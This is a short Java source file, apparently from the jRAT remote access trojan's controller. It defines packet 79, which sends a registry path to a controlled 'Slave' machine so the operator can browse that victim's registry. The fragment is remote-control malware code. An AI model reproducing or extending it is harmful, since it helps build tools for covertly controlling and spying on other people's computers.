package pro.jrat.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.Slave;


public class Packet79BrowseRegistry extends AbstractOutgoingPacket {
	
	private String location;
	
	public Packet79BrowseRegistry(String location) {
		this.location = location;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(location);
	}

	@Override
	public byte getPacketId() {
		return 79;
	}

}
